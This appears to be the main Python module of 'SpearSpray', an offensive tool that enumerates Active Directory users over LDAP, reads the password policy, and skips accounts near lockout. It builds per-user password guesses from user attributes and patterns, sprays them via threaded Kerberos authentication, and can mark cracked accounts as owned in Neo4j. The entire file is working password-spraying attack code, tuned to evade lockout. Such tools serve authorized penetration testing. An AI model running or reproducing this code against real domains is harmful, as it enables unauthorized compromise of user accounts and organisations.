import logging
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Generator

from spearspray.utils.constants import GREEN, RED, YELLOW, BLUE, BOLD, RESET
from spearspray.modules.variables import VariablesManager
from spearspray.modules.patterns import Patterns
from spearspray.modules.kerberos import Kerberos
from spearspray.utils.variables_utils import (
    register_variables,
    are_all_variables_registered,
    variable_resolver,
    get_used_variables,
    apply_leet
)
from spearspray.utils.ldap_utils import (
    connect_to_ldap,
    get_users_from_ldap,
    get_domain_password_policy,
    handle_domain_password_policy,
    filter_threshold_users,
    filter_pso_users
)
from spearspray.utils.net_utils import check_port_or_exit
from spearspray.modules.neo4j import Neo4j

class SpearSpray:
    
    def __init__(self, args):

        self.log = logging.getLogger(__name__)

        # LDAP connection parameters
        self.domain = args.domain
        self.username = args.username
        self.password = args.password
        self.target = args.domain_controller
        self.kdc = args.kdc or args.domain_controller
        self.query = args.query
        self.ssl = args.ssl
        self.ldap_page_size = args.ldap_page_size
        self.skip_port_check = args.skip_port_check

        # Neo4j connection parameters
        self.neo4j_username = args.neo4j_username
        self.neo4j_password = args.neo4j_password
        self.neo4j_uri = args.uri

        # Attack configuration
        self.threads = args.threads
        self.jitter = args.jitter
        self.max_rps = args.max_rps
        self.threshold = args.threshold

        # Pattern generation parameters
        self.extra = args.extra
        self.separator = args.separator
        self.suffix = args.suffix
        self.input_file = args.input
        self.leet = args.leet

        # LDAP attributes to retrieve for each user (needed for pattern generation and PSO detection)
        self.fields = ["name", "sAMAccountName", "pwdLastSet", "whenCreated", "badPwdCount", "msDS-ResultantPSO"]

    def run(self):

        # Initialize variables and pattern management

        variables_instance = VariablesManager()
        register_variables(variables_instance)
        variables_registered = variables_instance.get_all()

        patterns_instance = Patterns(self.extra, self.input_file)
        patterns_detected = patterns_instance.read_patterns_file()

        are_all_variables_registered(patterns_detected, variables_registered)

        # Neo4j connection

        neo4j_instance = None
        if self.neo4j_username and self.neo4j_password:
            neo4j_instance = Neo4j(self.neo4j_username, self.neo4j_password, self.neo4j_uri,)
            if neo4j_instance.connect() is None:
                sys.exit(1)

        # Port reachability checks (fail fast before any LDAP work if the KDC is unreachable)

        ldap_port = 636 if self.ssl else 389
        check_port_or_exit(self.target, ldap_port, "LDAPS" if self.ssl else "LDAP", skip=self.skip_port_check)
        check_port_or_exit(
            self.kdc, 88, "Kerberos",
            skip=self.skip_port_check,
            hint=f"You can also point the spraying to a different domain controller with {YELLOW}-kdc/--kdc{RESET}.",
        )

        # LDAP connection and enumeration

        ldap_instance, ldap_connection = connect_to_ldap(self.target, self.domain, self.username, self.password, self.ssl, self.ldap_page_size)

        if ldap_connection is None:
            self.log.error(f"{RED}[-]{RESET} Failed to establish LDAP connection. Exiting.")
            sys.exit(1)

        domain_policy = get_domain_password_policy(ldap_instance, ldap_connection)
        handle_domain_password_policy(domain_policy)

        users_objects = get_users_from_ldap(ldap_instance, ldap_connection, self.query, self.fields, self.username)
        ldap_instance.close_connection(ldap_connection)
        
        # Apply user filtering: PSO users and threshold-based filtering
        
        users_objects = filter_pso_users(users_objects)
        users_objects = filter_threshold_users(users_objects, domain_policy, self.threshold)
        
        if len(users_objects) == 0:
            self.log.error(f"{RED}[-]{RESET} No users remaining after filtering. Exiting.")
            sys.exit(1)

        self.log.warning(f"{BOLD}{YELLOW}[*] Password spraying will be performed against {len(users_objects)} users.{RESET}")

        # Pattern selection and password generation setup
        selected_pattern = patterns_instance.create_dynamic_menu(patterns_detected)
        filtered_variables = get_used_variables(variables_registered, selected_pattern)

        # Execute password spraying attack
        kerberos_instance = Kerberos(domain=self.domain, kdc=self.kdc, jitter=self.jitter, max_rps=self.max_rps, neo4j_instance=neo4j_instance)
        self.log.warning(f"{YELLOW}[*]{RESET} Starting password spraying against {len(users_objects)} users...")
        self._spray(kerberos_instance, users_objects, selected_pattern, filtered_variables)

        if neo4j_instance:
            neo4j_instance.close()

    def _build_credentials(self, users_objects: list[dict], selected_pattern: str, filtered_variables: list[str]) -> Generator[Tuple[str, str], None, None]:

        for entry in users_objects: 
            
            # Extract username and generate password using the selected pattern
            
            user: str = entry.get("sAMAccountName")                
            password: str = variable_resolver(entry, selected_pattern, filtered_variables, self.extra, self.separator, self.suffix,)

            if self.leet:
                password = apply_leet(password)

            yield (user, password)

    def _spray(self, kerberos_instance: Kerberos, users_objects: List[dict], selected_pattern: str, filtered_variables: List[str]) -> None:

        # TODO: Implement estimated time remaining based on total users, threads, jitter and max requests per second
        # TODO: Consider implementing an interactive progress feature similar to Nmap (allow pressing Enter to display remaining spraying duration and current progress)

        total_users = len(users_objects)
        credentials = self._build_credentials(users_objects, selected_pattern, filtered_variables)
        completed = 0

        with ThreadPoolExecutor(max_workers=self.threads) as pool:

            # Launch initial authentication attempts in parallel
            active_tasks = {
                pool.submit(kerberos_instance.authenticate, *next(credentials))
                for _ in range(min(self.threads, total_users)) # Limit initial tasks to the number of threads or users remaining if total_users < threads
            }

            while active_tasks:
                for completed_task in as_completed(active_tasks):
                    active_tasks.remove(completed_task)
                    completed += 1

                    try:
                        completed_task.result()
                    except Exception:
                        self.log.exception(f"{RED}[-]{RESET} Exception during thread execution.")
                        raise

                    # Debug mode: Log progress every 10 or 100 completed tasks
                    if completed <= 10 or completed % 100 == 0:
                        self.log.debug(f"[*] Completed {completed}/{total_users} attempts")

                    try:
                        active_tasks.add(
                            pool.submit(kerberos_instance.authenticate, *next(credentials))
                        )
                    except StopIteration:
                        # No more credentials to process
                        break

        kerberos_instance.cleanup()

        self._display_attack_summary(kerberos_instance)

    def _display_attack_summary(self, kerberos_instance: Kerberos) -> None:
        """Display a simple summary of the password spraying attack results."""
        
        stats = kerberos_instance.get_statistics()
        total_valid = kerberos_instance.get_valid_credentials_count()

        if stats['valid_credentials'] > 0 or stats['expired_credentials'] > 0:
            self.log.info(f"\n{BOLD}Attack Results:{RESET}")

            self.log.info(f"  Valid credentials: {GREEN}{stats['valid_credentials']}{RESET}")
            self.log.info(f"  Expired passwords: {YELLOW}{stats['expired_credentials']}{RESET}")
        
            if self.neo4j_username and self.neo4j_password:
                self.log.info(f"  Marked as owned:   {GREEN}{stats['neo4j_owned']}{RESET}")
            
            # Calculate and display success rate
            total_attempts = sum([stats['valid_credentials'], stats['expired_credentials'], 
                                stats['locked_accounts'], stats['valid_usernames'], 
                                stats['failed_attempts'], stats['other_errors']])
            success_rate = (total_valid / total_attempts * 100) if total_attempts > 0 else 0
            
            self.log.info(f"  Total attempts:    {BLUE}{total_attempts}{RESET}")
            self.log.info(f"  Success rate:      {GREEN if success_rate > 0 else RED}{success_rate:.2f}%{RESET}")
        
            print()
